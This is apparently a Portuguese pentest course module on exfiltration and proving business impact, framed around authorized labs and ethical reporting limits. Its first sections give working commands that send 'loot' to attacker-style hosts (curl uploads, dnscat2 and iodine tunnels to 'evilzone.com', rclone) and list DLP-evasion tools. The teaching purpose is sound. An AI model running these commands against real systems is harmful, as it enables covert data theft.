# 09 · Exfiltração e Prova de Impacto

> [← Anterior: Lateral & Persistência](../08-lateral-persistencia/README.md) · [Voltar ao índice](../../README.md) · [Próximo: Relatório →](../10-relatorio/README.md)

---

## Princípio

Demonstrar o impacto real de um atacante ao negócio — **sem causar dano ao ambiente produtivo**. Em pentest, exfiltração é PoC controlada, não roubo de dados.

> **Limite ético:** nunca exfiltre dados pessoais reais (PII) sem tratamento. Prefira metadados, hashes, ou amostras pequenas e anonimizadas no relatório.

---

## 1. Técnicas de Exfiltração

### HTTP(S) — o mais comum

```bash
# Upload simples
curl -F "file=@loot.tar.gz" https://seu-servidor.com/upload

# Base64 em POST
base64 loot.tar.gz | curl -d @- https://seu-servidor.com/

# Via webhook (Interactsh, Burp Collaborator, RequestBin)
curl -X POST -d @loot.txt https://xxxxx.oast.pro/
```

### DNS Tunneling — quando tudo mais é bloqueado

Firewalls frequentemente permitem DNS saindo. Use isso.

#### DNScat2

```bash
# Servidor (atacante, precisa controlar DNS do domínio)
dnscat2-server evilzone.com

# Cliente (alvo comprometido)
./dnscat2 evilzone.com
```

#### Iodine

```bash
# Servidor
iodined -f -c -P senha 10.0.0.1 tunnel.evilzone.com

# Cliente
iodine -f -P senha tunnel.evilzone.com
```

### ICMP Tunneling

```bash
# ptunnel, icmpsh, Hans VPN — úteis em redes muito restritas
```

### Protocolos "legítimos" para exfil stealth

| Canal | Ferramenta |
|---|---|
| Gmail/IMAP | Scripts Python customizados |
| Slack Webhook | `curl` para `hooks.slack.com/...` |
| Google Drive | `rclone` |
| S3 Bucket próprio | `aws s3 cp` |
| GitHub Gist | API do GitHub |
| Pastebin | API |

### rclone — sync multi-cloud

```bash
rclone config
rclone copy /loot/ remote:backup-evil/
```

---

## 2. Stealth & Ofuscação

### CloakifyFactory

Transforma binários/arquivos em formatos "inocentes" (listas de emojis, IPs, nomes). Útil para bypass de DLP básico.

```bash
python3 cloakify.py loot.zip ciphers/emoji.txt > encoded.txt
# (transfere encoded.txt por qualquer canal)
python3 decloakify.py encoded.txt ciphers/emoji.txt loot.zip
```

### PacketWhisper

DNS stealth encoding. Converte dados em queries DNS que passam como ruído normal.

### Steganography

Esconder dados em imagens/áudio. Interessante academicamente, raro em engagements reais.

- **steghide** — clássico
- **stegosuite** — GUI

---

## 3. Provas de Impacto no Relatório

A maior dificuldade do pentest não é obter acesso — é **documentar impacto de forma que gestão entenda**.

### Hierarquia de impacto (do mais fraco ao mais forte)

1. **"Vulnerabilidade existe"** — Nuclei detectou. Fraco.
2. **"Vulnerabilidade confirmada"** — Reprodução manual. OK.
3. **"Execução de código"** — RCE provado. Forte.
4. **"Acesso a dados sensíveis"** — Listei tabelas com PII. Muito forte.
5. **"Controle total"** — Domain Admin / root na produção. Máximo.
6. **"Impacto de negócio"** — "Poderia transferir R$ XX para conta externa". Impacto financeiro traduzido.

### Evidências aceitáveis

| Ação | Evidência recomendada |
|---|---|
| RCE | Screenshot de `whoami`, `hostname`, `id` |
| Leitura de DB | Schema + contagem de linhas (NÃO dump de PII) |
| Acesso a arquivos | Listagem de diretórios sensíveis + hash MD5 |
| Lateralização | Mapa BloodHound + timestamps dos logins |
| Privesc | Antes/depois: `id` antes, `id` depois |
| Bypass WAF/2FA | Request + response no Burp |

### Evidências éticas (o que NÃO fazer)

- Screenshot de CPFs reais de clientes
- Dump completo de base de usuários (salve hash count, não dados)
- Download de propriedade intelectual do cliente
- Alteração de dados em produção
- Manter credenciais depois do engagement

---

## 4. Data Impact Demonstrations (controladas)

Para cada tipo de dado, a prova de impacto pode ser:

**PII brasileira:**
```sql
-- Ao invés de: SELECT * FROM clientes;
-- Prove com:
SELECT COUNT(*) FROM clientes;
SELECT LEFT(cpf, 3) || '***' AS cpf_masked, LEFT(email, 3) || '***' AS email_masked FROM clientes LIMIT 5;
```

**Cartões de crédito:**
```sql
-- Prove presença do padrão sem exfiltrar:
SELECT COUNT(*) FROM transactions WHERE card_number REGEXP '^[0-9]{16}$';
-- Ou mostre apenas os últimos 4 dígitos
```

**Código-fonte:**
- Mostre estrutura de diretórios
- Cite nome de arquivos críticos (`config.py`, `.env`)
- NÃO baixe o repositório inteiro

---

## 5. Canary Tokens — deteção reversa

Use canary tokens para demonstrar que o atacante controlaria notificações:

- https://canarytokens.org — gera tokens (arquivos, URLs, DNS) que alertam quando acessados
- Útil para demonstrar persistência sem expor dados reais

---

## Exercícios

1. Num lab autorizado, exfiltre um arquivo de 50MB via HTTPS e depois via DNS (DNScat2). Compare tempo e stealth.
2. Produza um "impacto de negócio" escrito em uma página para um cliente fictício (e-commerce), traduzindo uma falha de SQLi em R$.
3. Use canary tokens para demonstrar persistência sem tocar em dados reais.

---

[← Anterior: Lateral & Persistência](../08-lateral-persistencia/README.md) · [Voltar ao índice](../../README.md) · [Próximo: Relatório →](../10-relatorio/README.md)
